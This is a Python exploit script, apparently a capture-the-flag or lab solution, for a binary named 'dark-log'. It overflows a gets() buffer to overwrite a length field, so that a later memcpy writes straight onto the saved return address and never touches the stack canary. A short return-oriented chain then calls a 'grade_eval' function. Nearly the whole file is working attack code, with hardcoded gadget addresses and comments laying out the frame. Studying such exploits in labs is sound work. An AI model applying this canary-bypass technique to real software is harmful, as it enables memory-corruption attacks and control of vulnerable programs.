#!/usr/bin/env python3
"""Bypass dark-log's canary by steering the in-frame memcpy destination."""
import struct
import sys


def address(value):
    return struct.pack("<Q", value)


pop_rdi_ret = 0x4018A3   # pop rdi; ret  (inside __libc_csu_init)
ret = 0x4018A4           # ret         (restores the SysV stack alignment)
grade_eval = 0x401677

# dark-log's frame layout:
#   f.expression  rbp-0x120   <- gets() destination
#   f.logMsg      rbp-0xa0
#   f.len         rbp-0x20    <- overwritten by the gets() overflow
#   f.pad         rbp-0x18
#   canary        rbp-0x8
#   saved rbp     rbp
#   saved rip     rbp+8
# The copy is memcpy(f.logMsg + f.len, f.expression, 128), i.e. its
# destination is rbp-0xa0 + f.len.  Sending f.len = 0xa8 makes that
# destination exactly rbp+8, so the 128-byte copy starts at the saved return
# address and never reaches the canary at rbp-0x8.  The canary check therefore
# still passes, and the first 8 bytes of f.expression become the new rip.
len_offset = 0xA8        # (rbp+8) - (rbp-0xa0)
chain = [pop_rdi_ret, 4, ret, grade_eval]
block = b"".join(address(value) for value in chain)
block += b"C" * (0x80 - len(block))

payload = block + b"D" * (0x100 - 0x80) + struct.pack("<I", len_offset)
assert len(payload) == 0x104
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
